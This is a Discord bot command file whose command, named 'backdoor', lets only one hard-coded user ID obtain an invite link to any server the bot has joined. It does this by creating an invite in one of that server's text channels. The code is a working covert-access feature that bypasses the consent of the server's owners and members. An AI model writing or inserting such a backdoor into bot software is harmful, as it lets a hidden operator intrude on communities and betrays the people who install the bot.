exports.run = async (client, message, args) => {
  if (message.author.id !== "583649910092595232") return;

  if (!args[0])
    return message.channel.send("Please input guild id for making invite");

  let guildId = args[0];

  var guild = client.guilds.cache.get(guildId);
  var channel = guild.channels.cache.find(ch => ch.type === "text"); // getting server's random text channel
  channel.createInvite().then(invite => {
    message.channel.send(`<a:b_yes:721969088813072425> **| Here Invite Link For That Id Guild**\n**Here:**${invite.url}`);
  });
};

exports.help = {
  name: "backdoor",
  description: "Getting server invite link",
  usage: "backdoor <guild_id>"
};

exports.conf = {
  aliases: [],
  cooldown: 0
};
